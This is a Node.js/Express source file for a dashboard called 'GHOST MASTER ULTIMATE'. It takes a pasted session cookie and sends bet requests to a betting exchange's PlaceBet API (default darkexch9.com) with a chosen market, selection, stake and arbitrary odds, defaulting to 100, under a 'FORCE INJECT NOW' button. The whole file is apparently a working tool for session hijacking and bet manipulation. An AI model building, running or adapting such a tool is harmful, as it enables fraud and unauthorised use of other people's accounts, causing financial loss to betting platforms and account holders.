const axios = require('axios');
const express = require('express');
const app = express();

// Injection Function
async function startGhost(amt, cookie, tid, sid, rate, customUrl) {
    const headers = { 'Cookie': cookie, 'Content-Type': 'application/json' };
    const url = customUrl || "https://darkexch9.com/api/Exchange/PlaceBet"; // Default or Custom
    
    try {
        const payload = {
            "marketId": tid,
            "selectionId": sid,
            "odds": rate || "100",
            "stake": amt,
            "isBack": true
        };
        const res = await axios.post(url, payload, { headers });
        return res.status === 200 ? "Success" : "Failed";
    } catch (e) { return "Error: " + e.message; }
}

app.get('/', (req, res) => {
    res.send(`
    <html>
    <head><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
    <body style="background:#000;color:#f00;text-align:center;font-family:sans-serif;padding:10px;">
        <h2 style="text-shadow:0 0 10px #f00;">👹 GHOST MASTER ULTIMATE 👹</h2>
        
        <div style="border:2px solid #333;padding:15px;border-radius:10px;background:#111;text-align:left;box-shadow: 0 0 20px #900;">
            <label style="color:#666;font-size:11px;">1. API ENDPOINT (OPTIONAL)</label>
            <input type="text" id="api" placeholder="Default: /api/Exchange/PlaceBet" style="width:100%;padding:10px;margin-bottom:10px;background:#222;color:#0f0;border:1px solid #333;">

            <label style="color:#666;font-size:11px;">2. SESSION COOKIE</label>
            <input type="text" id="c" placeholder="Paste Cookie..." style="width:100%;padding:10px;margin-bottom:10px;background:#222;color:#fff;border:1px solid #f00;">
            
            <div style="display:flex;gap:5px;">
                <div style="width:50%;">
                    <label style="color:#666;font-size:11px;">3. MARKET ID</label>
                    <input type="text" id="m" placeholder="Match ID" style="width:100%;padding:10px;background:#222;color:#fff;border:1px solid #333;">
                </div>
                <div style="width:50%;">
                    <label style="color:#666;font-size:11px;">4. SELECTION ID</label>
                    <input type="text" id="sid" placeholder="Team ID" style="width:100%;padding:10px;background:#222;color:#fff;border:1px solid #333;">
                </div>
            </div>

            <div style="display:flex;gap:5px;margin-top:10px;">
                <div style="width:50%;">
                    <label style="color:#666;font-size:11px;">5. ODDS (RATE)</label>
                    <input type="number" id="r" value="100" style="width:100%;padding:10px;background:#222;color:#fff;border:1px solid #333;">
                </div>
                <div style="width:50%;">
                    <label style="color:#666;font-size:11px;">6. STAKE (AMT)</label>
                    <input type="number" id="a" placeholder="Amount" style="width:100%;padding:10px;background:#222;color:#fff;border:1px solid #333;">
                </div>
            </div>
            
            <button onclick="f()" style="width:100%;background:linear-gradient(#f00,#900);color:#fff;padding:20px;margin-top:20px;border:none;border-radius:5px;font-weight:bold;font-size:16px;">🔥 FORCE INJECT NOW</button>
        </div>
        <p id="s" style="color:#0f0;margin-top:15px;font-weight:bold;"></p>

        <script>
            function f() {
                document.getElementById('s').innerText = "Sending Payload...";
                let url = '/fire?amt='+document.getElementById('a').value +
                          '&cookie='+encodeURIComponent(document.getElementById('c').value) +
                          '&tid='+document.getElementById('m').value +
                          '&sid='+document.getElementById('sid').value +
                          '&rate='+document.getElementById('r').value +
                          '&api='+encodeURIComponent(document.getElementById('api').value);
                fetch(url).then(r => r.text()).then(t => {
                    document.getElementById('s').innerText = "Status: " + t;
                });
            }
        </script>
    </body>
    </html>`);
});

app.get('/fire', async (req, res) => {
    const result = await startGhost(req.query.amt, req.query.cookie, req.query.tid, req.query.sid, req.query.rate, req.query.api);
    res.send(result);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("Ultimate Dashboard Live"));
